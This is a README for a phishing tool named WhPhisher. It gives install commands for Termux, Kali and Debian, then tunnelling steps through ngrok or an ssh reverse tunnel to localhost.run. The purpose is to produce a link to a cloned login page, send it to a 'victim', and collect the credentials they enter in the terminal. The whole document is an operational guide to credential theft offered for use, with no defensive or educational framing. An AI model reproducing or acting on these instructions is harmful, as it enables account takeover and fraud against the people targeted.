# WhPhisher

The best tool for phishing with the most famous pages updated.


# Tested on:

Termux, Kali Linux and debian


# Steps

To make this tool less likely to fail, it is advised to install the latest version of Termux, and the Termux API.


# -- How to install --

`pkg install bash`

`pkg install git`

`git clone https://github.com/WhBeatZ/WhPhisher.git`

`cd WhPhisher`

`chmod +x *`

`bash requirementswh.sh`

Wait for them to be installed and automatically start WhPhisher :D


![Virtual-Box-VM-Dib-Vpuj-JG9.png](https://i.postimg.cc/K86wfbyL/Virtual-Box-VM-Dib-Vpuj-JG9.png)

Choose the page and wait for the tunneling to start.

![Virtual-Box-VM-pqnlsb1ey-B.png](https://i.postimg.cc/gJJMyjfj/Virtual-Box-VM-pqnlsb1ey-B.png)

# Solution if the link is not generated or does not work (2 solutions)

# - - - Solution 1 - - -


`Open new session`

`cd NgrokWh`

`chmod +x ngrokwh.sh`

`./ngrokwh.sh`

`and`

`ngrok http 8080`

Share the link that generated the victim :D

Now we return to the main session, and if someone put their data, they will appear there :D

-Demonstration images:

![Screenshot-20220116-091839.png](https://i.postimg.cc/HW92dXc7/Screenshot-20220116-091839.png)


![Screenshot-20220116-091856.png](https://i.postimg.cc/kGKQ8yVm/Screenshot-20220116-091856.png)


![Screenshot-20220116-091939.png](https://i.postimg.cc/KvKRJy2v/Screenshot-20220116-091939.png)




# - - - Solution 2 - - -

Steps:

`We open a new session`

`cd`

`pkg install openssh -y`

`ssh -R 80:localhost:8080 nokey@localhost.run`

Share the link that was generated :D

# how it should look
- The green covers personal information
- The yellow arrow points to the link to be shared

<img src="/files/image4~3.jpeg" height="400">

# Result

- The link you sent to the victim:

![chrome-NQpwa-Yi-Wxc.png](https://i.postimg.cc/mrxzN5JH/chrome-NQpwa-Yi-Wxc.png)

When the victim puts her credentials, they arrive in the terminal:

![Virtual-Box-VM-t1m8-G0-J0-MQ.png](https://i.postimg.cc/wjj0Y7jV/Virtual-Box-VM-t1m8-G0-J0-MQ.png)
